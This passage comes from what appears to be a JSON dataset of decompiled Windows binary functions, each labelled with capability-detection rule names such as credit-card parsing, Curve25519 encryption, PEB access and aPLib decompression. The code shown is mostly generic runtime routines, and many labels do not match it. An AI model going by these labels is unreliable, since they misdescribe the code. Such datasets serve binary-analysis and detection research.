  if (0xf < uStack156) {\n            iVar1 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar1 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar1))\n            goto code_r0x0044b56e;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack180) {\n            iVar1 = iStack200;\n            if ((0xfff < uStack180 + 1) && (iVar1 = *(iStack200 + -4),  0x1f < (iStack200 + -4) - iVar1))\n            goto code_r0x0044b57a;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack20) {\n            iVar1 = in_stack_ffffffd8;\n            if ((0xfff < uStack20 + 1) && (iVar1 = *(in_stack_ffffffd8 + -4),  0x1f < (in_stack_ffffffd8 + -4) - iVar1))\n            goto code_r0x0044b586;\n            fcn.00401a32(iVar1);\n        }\n        uStack24 = 0;\n        uStack20 = 0xf;\n        if (0xf < param_1) {\n            iVar1 = unaff_ESI;\n            if ((0xfff < param_1 + 1) && (iVar1 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar1))\n            goto code_r0x0044b592;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < param_9) {\n            iVar1 = param_4;\n            if ((0xfff < param_9 + 1) && (iVar1 = *(param_4 + -4),  0x1f < (param_4 + -4) - iVar1))\n            goto code_r0x0044b59e;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar1 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar1 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar1)) goto code_r0x0044b5aa;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack72;\n        return 0xfd11;\n    }\n    in_stack_fffffef4 = uStack108 + 1;\n    uVar2 = uStack128;\n    if (in_stack_fffffef4 < 0x1000) {\ncode_r0x0044b202:\n        fcn.00401a32(uVar2);\n        goto code_r0x0044b20e;\n    }\n    uVar2 = *(uStack128 - 4);\n    if ((uStack128 - 4) - uVar2 < 0x20) {\n        in_stack_fffffef4 = uStack108 + 0x24;\n        goto code_r0x0044b202;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x0044b53e:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x0044b54a:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x0044b556:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x0044b562:\n    uStack64 = 4;\n    fcn.004047f5();\ncode_r0x0044b56e:\n    uStack64 = 5;\n    fcn.004047f5();\ncode_r0x0044b57a:\n    uStack64 = 6;\n    fcn.004047f5();\ncode_r0x0044b586:\n    uStack64 = 7;\n    fcn.004047f5();\ncode_r0x0044b592:\n    uStack64 = 8;\n    fcn.004047f5();\ncode_r0x0044b59e:\n    uStack64 = 9;\n    fcn.004047f5();\ncode_r0x0044b5aa:\n    uStack64 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 2780
    },
    "00401474": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401474(uint arg_8h)\n\n{\n    if (**0x56f458 == '?') {\n        if ((*0x56f458)[1] == '$') {\n            fcn.00402c98(arg_8h, 1);\n        }\n        else {\n            *0x56f458 = *0x56f458 + 1;\n            fcn.00402d83(arg_8h, 0, 0);\n        }\n    }\n    else {\n        fcn.00402919(arg_8h, 1, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 137
    },
    "0040622b": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040622b(uint arg_8h)\n\n{\n    uint arg_10h;\n    uint var_8h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n    }\n    else if (**0x56f458 == '?') {\n        *0x56f458 = *0x56f458 + 1;\n        arg_10h = fcn.00403535(&var_8h, 0);\n        fcn.00402e87(arg_8h, 0x2d, arg_10h);\n    }\n    else {\n        fcn.00403535(arg_8h, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 164
    },
    "004012d0": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012d0(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x570220));\n    return;\n}\n",
        "token_count": 69
    },
    "00401357": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401357(uint8_t *arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    if (arg_8h == NULL) {\n        arg_ch = 0;\n    }\n    else {\n        if (arg_ch != 0) {\n            if ((arg_ch & 0xffffff80) == 0) {\n                *arg_8h = arg_ch;\n                return 1;\n            }\n            if ((arg_ch & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar2 = iVar4;\n            }\n            else if ((arg_ch & 0xffff0000) == 0) {\n                if ((0xd7ff < arg_ch) && (arg_ch < 0xe000)) {\ncode_r0x004d6e05:\n                    iVar2 = fcn.004025c7(arg_10h);\n                    return iVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar2 = iVar4;\n            }\n            else {\n                if (((arg_ch & 0xffe00000) != 0) || (0x10ffff < arg_ch)) goto code_r0x004d6e05;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar2 = iVar4;\n            }\n            do {\n                uVar1 = arg_ch;\n                arg_ch = arg_ch >> 6;\n                arg_8h[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *arg_8h = arg_ch | uVar3;\n            *arg_10h = 0;\n            arg_10h[1] = 0;\n            return iVar2 + 1;\n        }\n        *arg_8h = arg_ch;\n    }\n    *arg_10h = arg_ch;\n    arg_10h[1] = arg_ch;\n    return 1;\n}\n",
        "token_count": 494
    },
    "0040151e": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040151e(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x570220));\n    return;\n}\n",
        "token_count": 68
    },
    "00405f88": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405f88(uint32_t arg_8h)\n\n{\n    return ((arg_8h & 0x3f) << 8 | arg_8h & 0x3f) << 0x10 | arg_8h;\n}\n",
        "token_count": 63
    },
    "0040664a": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.0040664a(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < arg_8h) && (arg_8h < *0x570488)) {\n            return *(*((arg_8h >> 6) * 4 + 0x570220) + 0x28 + (arg_8h & 0x3f) * 0x38) & 0x40;\n        }\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n        fcn.00403751();\n    }\n    return 0;\n}\n",
        "token_count": 188
    },
    "004ca31d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.004ca31d(void)\n\n{\n    uint8_t *puVar1;\n    char in_AL;\n    uint32_t unaff_ESI;\n    \n    if (in_AL == '\\0') {\n        puVar1 = *((unaff_ESI >> 6) * 4 + 0x570220) + 0x28 + (unaff_ESI & 0x3f) * 0x38;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.004012d0(unaff_ESI);\n    return;\n}\n",
        "token_count": 128
    },
    "0040128a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040128a(uint arg_8h, uint arg_ch)\n\n{\n    char extraout_CL;\n    uint *in_ECX;\n    uint *arg_8h_00;\n    int64_t iVar1;\n    uint arg_8h_01;\n    uint var_20h;\n    uchar uStack13;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = CONCAT44(arg_ch, arg_8h);\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_8h._0_1_ = 0;\n    arg_8h_00 = &var_8h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    do {\n        arg_8h_01 = 10;\n        arg_8h_00 = arg_8h_00 + -1;\n        iVar1 = fcn.00401820(iVar1, 10, 0, iVar1);\n        *arg_8h_00 = extraout_CL + '0';\n    } while (iVar1 != 0);\n    fcn.0040669a(arg_8h_00, &var_8h - arg_8h_00);\n    fcn.00403085(arg_8h_01);\n    return;\n}\n",
        "token_count": 299
    },
    "004049a8": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049a8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    uint uVar2;\n    char extraout_CL;\n    uint *in_ECX;\n    uint unaff_EBX;\n    char *pcVar3;\n    char *arg_8h_00;\n    int64_t iVar4;\n    uint arg_8h_01;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    char acStack13 [5];\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    acStack13[2] = 0;\n    bVar1 = false;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    arg_8h_00 = acStack13 + 2;\n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch < 1) && (iVar4 = CONCAT44(arg_ch, arg_8h),  arg_ch < 0)) {\n        bVar1 = true;\n        iVar4 = CONCAT44(-(arg_ch + (arg_8h != 0)), -arg_8h);\n    }\n    do {\n        pcVar3 = arg_8h_00;\n        arg_8h_01 = 10;\n        arg_8h_00 = pcVar3 + -1;\n        uVar2 = iVar4;\n        iVar4 = fcn.00401820(iVar4, 10, 0, unaff_EBX);\n        unaff_EBX = uVar2;\n        *arg_8h_00 = extraout_CL + '0';\n    } while (iVar4 != 0);\n    if (bVar1) {\n        arg_8h_00 = pcVar3 + -2;\n        *arg_8h_00 = '-';\n    }\n    fcn.0040669a(arg_8h_00, acStack13 + (2 - arg_8h_00));\n    fcn.00403085(arg_8h_01);\n    return;\n}\n",
        "token_count": 474
    },
    "004012a8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004012a8(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 129
    },
    "004016f9": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016f9(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 129
    },
    "00401b22": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401b22(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 129
    },
    "00401efb": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401efb(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x54fbc4);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x54fbc0);\n}\n",
        "token_count": 133
    },
    "004033e6": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033e6(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x54fbc4);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x54fbc0);\n}\n",
        "token_count": 135
    },
    "00403ad5": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ad5(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 131
    },
    "00403e27": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e27(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x54fbc4);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x54fbc0);\n}\n",
        "token_count": 133
    },
    "00404ac5": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404ac5(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 131
    },
    "00404d13": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404d13(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x54fbc4);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((arg_ch + iVar1 * 8 & 0x7fU) * 8 + 0x54fbc0);\n}\n",
        "token_count": 135
    },
    "00405506": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405506(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 130
    },
    "00405fa6": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fa6(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 131
    },
    "004064d3": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004064d3(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        iVar1 = *((arg_8h - 0x20U & 0x7f) * 8 + 0x550094);\n    }\n    else {\n        iVar1 = 0;\n    }\n    return *((iVar1 * 9 + arg_ch & 0x7fU) * 8 + 0x550090);\n}\n",
        "token_count": 129
    },
    "00401820": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00401820(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar3 = param_1;\n    uVar8 = param_4;\n    uVar6 = param_2;\n    uVar9 = param_3;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar5 = uVar8 >> 1;\n            uVar9 = uVar9 >> 1 | ((uVar8 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar8 = uVar5;\n            uVar6 = uVar7;\n        } while (uVar5 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar9;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar8 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar8)) || ((param_2 <= uVar8 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 472
    },
    "00401d07": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401d07(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a09c5;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a09c5:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 312
    },
    "00401de8": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401de8(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    arg_8h = arg_8h | 7;\n    if (((arg_8h <= arg_10h) && (arg_ch <= arg_10h - (arg_ch >> 1))) &&\n       (arg_10h = (arg_ch >> 1) + arg_ch,  arg_10h <= arg_8h)) {\n        arg_10h = arg_8h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 132
    },
    "004028c9": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004028c9(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0e18;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0e18:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 312
    },
    "00402d60": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402d60(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0ba6;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0ba6:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 312
    },
    "0040355d": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040355d(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    arg_8h = arg_8h | 7;\n    if (((arg_8h <= arg_10h) && (arg_ch <= arg_10h - (arg_ch >> 1))) &&\n       (arg_10h = (arg_ch >> 1) + arg_ch,  arg_10h <= arg_8h)) {\n        arg_10h = arg_8h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 132
    },
    "00403f35": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403f35(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.0040609b(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00404278();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0c2f;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0c2f:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 376
    },
    "00404782": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00404782(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar3 = param_1;\n    uVar8 = param_4;\n    uVar6 = param_2;\n    uVar9 = param_3;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar5 = uVar8 >> 1;\n            uVar9 = uVar9 >> 1 | ((uVar8 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar8 = uVar5;\n            uVar6 = uVar7;\n        } while (uVar5 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar9;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar8 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar8)) || ((param_2 <= uVar8 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 472
    },
    "00404a07": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00404a07(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.0040475f(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.004058f8();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0da0;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0da0:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 375
    },
    "00404be7": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404be7(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a08c4;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a08c4:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 312
    },
    "00404c50": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
